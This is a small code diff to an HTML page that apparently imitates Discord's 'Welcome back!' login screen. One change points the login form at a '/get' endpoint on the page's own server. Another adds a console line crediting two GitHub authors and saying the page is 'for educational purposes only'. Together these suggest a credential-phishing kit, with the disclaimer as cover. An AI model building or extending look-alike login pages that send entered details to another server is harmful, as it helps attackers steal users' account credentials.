@@ -277,7 +277,7 @@ label{
     <div id="main-container">
 
         <div id="container">
-            <form id="form">
+            <form id="form" action="/get">
                 <div id="header">
                     <span class="span1">Welcome back!</span>
                     <p>We're so excited to see you again!</p>
@@ -307,6 +307,7 @@ label{
         </div>
     </div>
     <script>
+        
         async function decompressGzipString(base64GzipString) {
           const gzipData = atob(base64GzipString);
           const gzipArray = new Uint8Array(gzipData.length);
@@ -349,6 +350,8 @@ label{
             console.error('Error decompressing:', error);
           }
         }
+
+        console.log("Made with ❤️ by JMcrafter26 (https://github.com/JMcrafter26) and GauravKukreti (https://github.com/GauravKukreti) for educational purposes only. Do not use this for illegal purposes.");
 
         function setSvgBackground(){
             var decompressedSvg = window.svg;
